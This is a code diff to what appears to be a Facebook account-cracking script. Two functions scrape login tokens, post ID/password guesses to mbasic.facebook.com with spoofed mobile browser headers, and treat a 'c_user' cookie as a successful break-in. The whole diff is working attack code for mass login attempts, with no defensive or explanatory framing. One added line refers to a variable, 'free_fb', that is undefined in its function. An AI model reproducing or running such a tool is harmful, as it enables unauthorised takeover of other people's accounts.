@@ -195,7 +195,7 @@ def _M1_(ids,pasx):
                         apple = {
                         'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                         'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-                        'email': idf,
+                        'email': ids,
                         'login_source': 'comet_headerless_login',
                         'next': '',
                         'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps) }
@@ -286,37 +286,28 @@ def _M2_(ids,pasx):
                         pro = random.choice(ugen)
                         BLACKX = session.get('https://mbasic.facebook.com').text
                         apple = {
-                            "lsd":re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
-                        "jazoest":re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
-                        "m_ts":re.search('name="m_ts" value="(.*?)"', str(BLACKX)).group(1),
-                        "li":re.search('name="li" value="(.*?)"', str(BLACKX)).group(1),
-                        "try_number":"0",
-                        "unrecognized_tries":"0",
-                        "email":ids,
-                        "pass":ps,
-                        "login":"Log In"}
-                        tedy = {'authority': 'mbasic.facebook.com',
-                        'method': 'GET',
-                        'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
-                        'scheme': 'https',
-                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'cache-control': 'max-age=0',
-                        'dpr': '2',
-                        'sec-ch-prefers-color-scheme': 'light',
-                        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-                        'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.73", "Not(A:Brand";v="8.0.0.0"',
-                        'sec-ch-ua-mobile': '?1',
-                        'sec-ch-ua-model': '"V2043"',
-                        'sec-ch-ua-platform': '"Android"',
-                        'sec-ch-ua-platform-version': '"11.0.0"',
-                        'sec-fetch-dest': 'document',
-                        'sec-fetch-mode': 'navigate',
-                        'sec-fetch-site': 'none',
-                        'sec-fetch-user': '?1',
-                        'upgrade-insecure-requests': '1',
-                        'user-agent': pro,
-                        'viewport-width': '980',}
+                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
+                        'lsd': re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
+                        'email': ids,
+                        'login_source': 'comet_headerless_login',
+                        'next': '',
+                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps) }
+                        tedy = {
+    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://m.facebook.com/',
+    'DNT': '1',  # Do Not Track
+    'Pragma': 'no-cache',
+    'TE': 'Trailers', }
                         lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
